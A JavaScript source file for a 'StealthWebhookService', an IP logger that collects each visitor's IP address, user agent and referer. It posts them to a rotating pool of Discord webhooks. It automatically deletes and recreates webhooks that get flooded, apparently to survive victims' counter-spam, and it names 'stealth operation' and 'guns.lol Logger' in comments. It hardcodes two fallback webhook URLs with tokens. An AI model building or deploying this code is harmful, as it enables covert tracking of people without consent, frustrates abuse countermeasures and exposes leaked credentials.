const fetch = require('node-fetch');

class StealthWebhookService {
  constructor() {
    // Discord Bot Configuration - Use environment variables
    this.botToken = process.env.DISCORD_BOT_TOKEN || 'YOUR_BOT_TOKEN_HERE';
    this.channelId = process.env.DISCORD_CHANNEL_ID || 'YOUR_CHANNEL_ID_HERE';
    this.discordApiBase = 'https://discord.com/api/v10';

    // Anti-spam configuration
    this.spamThreshold = 10; // messages per second
    this.spamWindow = 1000; // 1 second window
    this.messageHistory = new Map(); // Track messages per webhook
    this.spamDetected = new Set(); // Track webhooks with spam

    // Load webhook URLs from environment variables
    this.webhooks = this.loadWebhooksFromEnv();

    this.currentWebhookIndex = 0;
    this.rateLimitDelay = 1000; // 1 second between requests
    this.maxFailures = 3; // Max failures before marking webhook as inactive
    this.retryDelay = 5000; // 5 seconds before retrying failed webhook
    this.lastRequestTime = 0;

    // Start spam detection cleanup
    this.startSpamCleanup();
  }

  // Load webhook URLs from environment variables
  loadWebhooksFromEnv() {
    try {
      console.log('🔗 Loading webhooks from environment variables...');
      const webhooks = [];
      const webhookCount = parseInt(process.env.WEBHOOK_COUNT) || 13;
      
      console.log(`🔗 Expected webhook count: ${webhookCount}`);
      
      for (let i = 1; i <= webhookCount; i++) {
        const webhookUrl = process.env[`WEBHOOK_URL_${i}`];
        if (webhookUrl) {
          console.log(`✅ Webhook ${i}: ${webhookUrl.substring(0, 50)}...`);
          webhooks.push({
            url: webhookUrl,
            id: `webhook_${i}`,
            status: 'active',
            lastUsed: null,
            failureCount: 0,
            lastFailure: null,
            messageCount: 0,
            lastMessageTime: null
          });
        } else {
          console.log(`❌ Webhook ${i}: NOT SET`);
        }
      }

      console.log(`🔗 Loaded ${webhooks.length} webhooks from environment`);

      // If no webhooks found in env, use fallback
      if (webhooks.length === 0) {
        console.warn('⚠️ No webhook URLs found in environment variables. Using fallback webhooks.');
        return this.getFallbackWebhooks();
      }

      return webhooks;
    } catch (error) {
      console.error('❌ Error loading webhooks from environment:', error.message);
      console.error('❌ Error stack:', error.stack);
      return this.getFallbackWebhooks();
    }
  }

  // Fallback webhooks (for development/testing)
  getFallbackWebhooks() {
    return [
      {
        url: 'https://discord.com/api/webhooks/1395900214824665098/cn3U16abUx054ptKaxUkhwjPCYotOJeZBuAer6GVWrItAAzNj20kl0U4QU83k4KWgI6c',
        id: 'webhook_1',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      },
      {
        url: 'https://discord.com/api/webhooks/1395900221535293501/Zx1OSNZbDbw89LBDOKIh8k3nd9Gz1UffCyTbDOD2AWirGw3Llfws2s9YAYSkBzkegT5s',
        id: 'webhook_2',
        status: 'active',
        lastUsed: null,
        failureCount: 0,
        lastFailure: null,
        messageCount: 0,
        lastMessageTime: null
      }
    ];
  }

  // Get client IP address from request
  getClientIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           req.ip || 
           'unknown';
  }

  // Get website URL from request
  getWebsiteUrl(req) {
    const protocol = req.headers['x-forwarded-proto'] || req.protocol;
    const host = req.headers['x-forwarded-host'] || req.get('host');
    const url = `${protocol}://${host}`;
    console.log('🌐 Detected website URL:', url);
    console.log('🌐 Headers debug:', {
      'x-forwarded-proto': req.headers['x-forwarded-proto'],
      'x-forwarded-host': req.headers['x-forwarded-host'],
      'host': req.get('host'),
      'protocol': req.protocol
    });
    return url;
  }

  // Get website name from request
  getWebsiteName(req) {
    const host = req.headers['x-forwarded-host'] || req.get('host');
    const websiteName = host.replace(/^www\./, '').split('.')[0] || 'Unknown Site';
    console.log('🌐 Detected website name:', websiteName);
    console.log('🌐 Host for name extraction:', host);
    return websiteName;
  }

  // Rate limiting protection
  async checkRateLimit() {
    const now = Date.now();
    const timeSinceLastRequest = now - this.lastRequestTime;
    
    if (timeSinceLastRequest < this.rateLimitDelay) {
      await new Promise(resolve => setTimeout(resolve, this.rateLimitDelay - timeSinceLastRequest));
    }
    
    this.lastRequestTime = Date.now();
  }

  // Check for spam on a webhook
  checkSpam(webhookId) {
    const now = Date.now();
    const webhook = this.webhooks.find(w => w.id === webhookId);
    
    if (!webhook) return false;

    // Reset message count if outside spam window
    if (!webhook.lastMessageTime || (now - webhook.lastMessageTime) > this.spamWindow) {
      webhook.messageCount = 0;
      webhook.lastMessageTime = now;
    }

    // Increment message count
    webhook.messageCount++;

    // Check if spam threshold exceeded
    if (webhook.messageCount >= this.spamThreshold) {
      this.spamDetected.add(webhookId);
      return true;
    }

    return false;
  }

  // Clean up spam detection data
  startSpamCleanup() {
    setInterval(() => {
      const now = Date.now();
      
      // Clean up old message history
      for (const [webhookId, messages] of this.messageHistory.entries()) {
        const filteredMessages = messages.filter(msg => (now - msg.timestamp) < this.spamWindow);
        if (filteredMessages.length === 0) {
          this.messageHistory.delete(webhookId);
        } else {
          this.messageHistory.set(webhookId, filteredMessages);
        }
      }

      // Reset spam detection for webhooks that haven't been used recently
      for (const webhook of this.webhooks) {
        if (webhook.lastMessageTime && (now - webhook.lastMessageTime) > this.spamWindow * 2) {
          webhook.messageCount = 0;
          this.spamDetected.delete(webhook.id);
        }
      }
    }, 5000); // Clean up every 5 seconds
  }

  // Delete webhook using Discord API
  async deleteWebhook(webhookUrl) {
    try {
      const webhookId = webhookUrl.split('/').slice(-2)[0];
      
      const response = await fetch(`${this.discordApiBase}/webhooks/${webhookId}`, {
        method: 'DELETE',
        headers: {
          'Authorization': `Bot ${this.botToken}`,
          'Content-Type': 'application/json'
        }
      });

      return response.ok;
    } catch (error) {
      return false;
    }
  }

  // Create new webhook using Discord API
  async createWebhook(name = null) {
    try {
      // Generate dynamic webhook name if not provided
      const webhookName = name || `${this.getWebsiteNameFromEnv()} Logger ${Date.now()}`;
      
      const response = await fetch(`${this.discordApiBase}/channels/${this.channelId}/webhooks`, {
        method: 'POST',
        headers: {
          'Authorization': `Bot ${this.botToken}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          name: webhookName,
          avatar: null
        })
      });

      if (response.ok) {
        const webhookData = await response.json();
        
        // Send notification about new webhook creation
        await this.notifyWebhookCreation(webhookData);
        
        return {
          url: `https://discord.com/api/webhooks/${webhookData.id}/${webhookData.token}`,
          id: `webhook_${Date.now()}`,
          status: 'active',
          lastUsed: null,
          failureCount: 0,
          lastFailure: null,
          messageCount: 0,
          lastMessageTime: null,
          name: webhookData.name,
          discordId: webhookData.id
        };
      } else {
        return null;
      }
    } catch (error) {
      return null;
    }
  }

  // Notify about webhook creation
  async notifyWebhookCreation(webhookData) {
    try {
      // Use the first available webhook to send notification
      const availableWebhook = this.webhooks.find(w => w.status === 'active' && !this.spamDetected.has(w.id));
      
      if (availableWebhook) {
        const websiteName = this.getWebsiteNameFromEnv();
        const notificationPayload = {
          embeds: [{
            title: "🔗 New Webhook Created",
            description: "A new webhook has been automatically created to replace a spam-detected webhook.",
            color: 0x00ff00,
            fields: [
              {
                name: "📝 Webhook Name",
                value: webhookData.name,
                inline: true
              },
              {
                name: "🆔 Webhook ID",
                value: webhookData.id,
                inline: true
              },
              {
                name: "⏰ Created At",
                value: new Date().toISOString(),
                inline: true
              },
              {
                name: "🚨 Reason",
                value: "Spam detection triggered automatic regeneration",
                inline: false
              }
            ],
            footer: {
              text: `${websiteName} - Anti-Spam System`
            },
            timestamp: new Date().toISOString()
          }]
        };

        await fetch(availableWebhook.url, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(notificationPayload)
        });
      }
    } catch (error) {
      // Silent error handling for stealth operation
    }
  }

  // Handle spam detection and webhook regeneration
  async handleSpam(webhookId) {
    const webhook = this.webhooks.find(w => w.id === webhookId);
    if (!webhook) return;

    // Mark webhook as inactive
    webhook.status = 'inactive';
    webhook.failureCount = this.maxFailures + 1;

    // Delete the webhook from Discord
    await this.deleteWebhook(webhook.url);

    // Create a new webhook to replace it
    const newWebhook = await this.createWebhook(`guns.lol Logger ${Date.now()}`);
    
    if (newWebhook) {
      // Replace the old webhook with the new one
      const index = this.webhooks.findIndex(w => w.id === webhookId);
      if (index !== -1) {
        this.webhooks[index] = newWebhook;
      }
    }

    // Remove from spam detected set
    this.spamDetected.delete(webhookId);
  }

  // Validate webhook URL
  async validateWebhook(webhook) {
    try {
      const response = await fetch(webhook.url, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json'
        },
        timeout: 5000
      });

      return response.ok;
    } catch (error) {
      return false;
    }
  }

  // Get next available webhook
  async getNextAvailableWebhook() {
    let attempts = 0;
    const maxAttempts = this.webhooks.length;

    while (attempts < maxAttempts) {
      const webhook = this.webhooks[this.currentWebhookIndex];
      
      // Check if webhook is active, hasn't failed too many times, and isn't spam detected
      if (webhook.status === 'active' && 
          webhook.failureCount < this.maxFailures && 
          !this.spamDetected.has(webhook.id)) {
        
        // Validate webhook if it hasn't been used recently
        if (!webhook.lastUsed || Date.now() - webhook.lastUsed > 300000) { // 5 minutes
          const isValid = await this.validateWebhook(webhook);
          if (!isValid) {
            webhook.status = 'inactive';
            webhook.failureCount++;
            webhook.lastFailure = Date.now();
            this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhooks.length;
            attempts++;
            continue;
          }
        }
        
        return webhook;
      }
      
      // Move to next webhook
      this.currentWebhookIndex = (this.currentWebhookIndex + 1) % this.webhooks.length;
      attempts++;
    }

    // If no webhooks are available, try to reactivate some
    await this.reactivateWebhooks();
    
    // Try one more time after reactivation
    for (let i = 0; i < this.webhooks.length; i++) {
      const webhook = this.webhooks[i];
      if (webhook.status === 'active' && 
          webhook.failureCount < this.maxFailures && 
          !this.spamDetected.has(webhook.id)) {
        this.currentWebhookIndex = i;
        return webhook;
      }
    }

    throw new Error('No available webhooks');
  }

  // Reactivate webhooks that have been inactive for a while
  async reactivateWebhooks() {
    const reactivationDelay = 300000; // 5 minutes
    
    for (const webhook of this.webhooks) {
      if (webhook.status === 'inactive' && 
          webhook.lastFailure && 
          Date.now() - webhook.lastFailure > reactivationDelay &&
          !this.spamDetected.has(webhook.id)) {
        
        const isValid = await this.validateWebhook(webhook);
        if (isValid) {
          webhook.status = 'active';
          webhook.failureCount = 0;
          webhook.lastFailure = null;
        }
      }
    }
  }

  // Get website information from request
  getWebsiteInfo(req) {
    try {
      const host = req.headers.host || 'unknown';
      const origin = req.headers.origin || '';
      const referer = req.headers.referer || '';
      
      // Determine website URL and name
      let websiteUrl = origin || `https://${host}`;
      let websiteName = host.split('.')[0]; // Extract subdomain or domain name
      
      // Clean up website name
      if (websiteName === 'www') {
        websiteName = host.split('.').slice(1, -1).join('.');
      }
      
      // Handle custom domains better
      if (host.includes('.vercel.app')) {
        // Vercel subdomain
        websiteName = host.split('.')[0];
      } else if (host.split('.').length === 2) {
        // Custom domain (e.g., example.com)
        websiteName = host.split('.')[0];
      } else if (host.split('.').length > 2) {
        // Subdomain (e.g., sub.example.com)
        websiteName = host.split('.')[0];
      }
      
      // Capitalize first letter
      websiteName = websiteName.charAt(0).toUpperCase() + websiteName.slice(1);
      
      // Fallback to environment variable if available
      if (process.env.WEBSITE_NAME) {
        websiteName = process.env.WEBSITE_NAME;
      }
      
      console.log('🌐 Website info detected:', {
        host,
        origin,
        referer,
        websiteUrl,
        websiteName
      });
      
      return { websiteUrl, websiteName };
    } catch (error) {
      console.error('❌ Error getting website info:', error.message);
      return {
        websiteUrl: process.env.WEBSITE_URL || 'https://unknown.com',
        websiteName: process.env.WEBSITE_NAME || 'Unknown Website'
      };
    }
  }

  // Send message to webhook with retry logic and spam detection
  async sendMessage(payload, req) {
    try {
      console.log('📤 Starting webhook message send...');
      await this.checkRateLimit();

      // Get client information
      const clientIP = req.headers['x-forwarded-for'] || req.ip || req.connection.remoteAddress || 'unknown';
      const userAgent = req.headers['user-agent'] || 'Unknown';
      const timestamp = new Date().toISOString();
      
      // Get website information
      const { websiteUrl, websiteName } = this.getWebsiteInfo(req);

      console.log('📤 Message details:', {
        clientIP,
        websiteUrl,
        websiteName,
        userAgent: userAgent.substring(0, 50) + '...'
      });

      // Create enhanced payload with website info
      const enhancedPayload = {
        embeds: [{
          title: `🌐 New Visitor on ${websiteName}`,
          description: `Someone visited your website!`,
          color: 0x00ff00,
          fields: [
            {
              name: '📍 IP Address',
              value: `\`${clientIP}\``,
              inline: true
            },
            {
              name: '🌍 Website',
              value: `\`${websiteUrl}\``,
              inline: true
            },
            {
              name: '🕒 Timestamp',
              value: `<t:${Math.floor(Date.now() / 1000)}:F>`,
              inline: true
            },
            {
              name: '🔍 User Agent',
              value: `\`\`\`${userAgent}\`\`\``,
              inline: false
            },
            {
              name: '📱 Referer',
              value: req.headers.referer ? `\`${req.headers.referer}\`` : '`Direct Visit`',
              inline: false
            }
          ],
          footer: {
            text: `${websiteName} IP Logger • ${new Date().toLocaleDateString()}`
          },
          timestamp: timestamp
        }]
      };

      console.log('📤 Enhanced payload created');

      let lastError = null;
      const maxRetries = 3;

      for (let retry = 0; retry < maxRetries; retry++) {
        try {
          console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
          const webhook = await this.getNextAvailableWebhook();

          console.log(`📤 Using webhook: ${webhook.id}`);

          // Check for spam before sending
          if (this.checkSpam(webhook.id)) {
            console.log(`🚨 Spam detected on webhook ${webhook.id}, handling...`);
            await this.handleSpam(webhook.id);
            continue; // Try with next webhook
          }

          console.log(`📤 Sending to webhook URL: ${webhook.url.substring(0, 50)}...`);

          const response = await fetch(webhook.url, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(enhancedPayload),
            timeout: 10000
          });

          console.log(`📤 Webhook response status: ${response.status}`);

          if (response.ok) {
            // Success - update webhook stats
            webhook.lastUsed = Date.now();
            webhook.failureCount = 0;
            webhook.lastFailure = null;

            console.log('✅ Webhook message sent successfully');
            return {
              success: true,
              webhookId: webhook.id,
              message: 'Message sent successfully',
              websiteName,
              websiteUrl
            };
          } else {
            // Handle different error responses
            const responseText = await response.text();
            console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);

            if (response.status === 404) {
              webhook.status = 'inactive';
              webhook.failureCount++;
              webhook.lastFailure = Date.now();
              console.log(`❌ Webhook ${webhook.id} marked as inactive (404)`);
            } else if (response.status === 429) {
              // Rate limited - wait and retry
              const retryAfter = response.headers.get('retry-after') || 60;
              console.log(`⏳ Rate limited, waiting ${retryAfter} seconds...`);
              await new Promise(resolve => setTimeout(resolve, retryAfter * 1000));
            } else {
              webhook.failureCount++;
              webhook.lastFailure = Date.now();
              console.log(`❌ Webhook ${webhook.id} failed (${response.status})`);
            }

            lastError = new Error(`HTTP ${response.status}: ${response.statusText}`);
          }
        } catch (error) {
          console.error(`❌ Webhook attempt ${retry + 1} failed:`, error.message);
          lastError = error;

          // Mark current webhook as failed
          if (this.webhooks[this.currentWebhookIndex]) {
            this.webhooks[this.currentWebhookIndex].failureCount++;
            this.webhooks[this.currentWebhookIndex].lastFailure = Date.now();
          }
        }

        // Wait before retry
        if (retry < maxRetries - 1) {
          console.log(`⏳ Waiting ${this.retryDelay}ms before retry...`);
          await new Promise(resolve => setTimeout(resolve, this.retryDelay));
        }
      }

      console.error(`❌ Failed to send message after ${maxRetries} retries`);
      throw new Error(`Failed to send message after ${maxRetries} retries. Last error: ${lastError.message}`);
    } catch (error) {
      console.error('❌ sendMessage error:', error.message);
      console.error('❌ sendMessage error stack:', error.stack);
      throw error;
    }
  }

  // Get webhook status for monitoring (stealth version)
  getWebhookStatus() {
    return {
      total: this.webhooks.length,
      active: this.webhooks.filter(w => w.status === 'active' && !this.spamDetected.has(w.id)).length,
      inactive: this.webhooks.filter(w => w.status === 'inactive' || this.spamDetected.has(w.id)).length,
      spamDetected: this.spamDetected.size,
      currentIndex: this.currentWebhookIndex,
      webhooks: this.webhooks.map(w => ({
        id: w.id,
        status: w.status,
        failureCount: w.failureCount,
        lastUsed: w.lastUsed,
        lastFailure: w.lastFailure,
        messageCount: w.messageCount,
        spamDetected: this.spamDetected.has(w.id),
        name: w.name || 'Unknown'
      }))
    };
  }

  // Get spam statistics
  getSpamStats() {
    return {
      spamDetected: this.spamDetected.size,
      totalWebhooks: this.webhooks.length,
      activeWebhooks: this.webhooks.filter(w => w.status === 'active' && !this.spamDetected.has(w.id)).length,
      spamThreshold: this.spamThreshold,
      spamWindow: this.spamWindow
    };
  }

  // Get website name from environment or default
  getWebsiteNameFromEnv() {
    return process.env.WEBSITE_NAME || 'Website';
  }
}

module.exports = StealthWebhookService; 